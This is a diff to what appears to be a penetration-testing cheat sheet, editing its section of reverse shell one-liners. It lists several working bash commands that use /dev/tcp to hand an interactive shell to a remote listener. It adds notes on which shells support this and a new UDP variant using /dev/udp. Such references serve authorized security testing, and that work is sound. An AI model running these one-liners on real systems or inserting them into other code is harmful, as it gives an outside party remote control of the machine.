@@ -247,13 +247,19 @@ python icmpsh_m.py <HOST_IP> <TARGET_IP>
 
 #### One-liners reverse shell
 
-###### [Linux] Bash
+###### [Linux] sh / bash
 
 ```bash
+# TCP (requires a TCP listener).
+# In order to use the "/dev/tcp" device file, the current shell must be bash (and not sh or dash).
+# Use bash -c "<REVERSE_ONELINER>" if the current shell is sh or dash.
 bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 exec 5<>/dev/tcp/<IP>/<PORT>;cat <&5 | while read line; do $line 2>&5 >&5; done
 exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
 0<&196;exec 196<>/dev/tcp/<IP>/<PORT>; sh <&196 >&196 2>&196
+
+# UDP (requires an UDP listener).
+sh -i >& /dev/udp/<IP>/<PORT> 0>&1
 ```
 
 ###### [Linux / Windows] Netcat
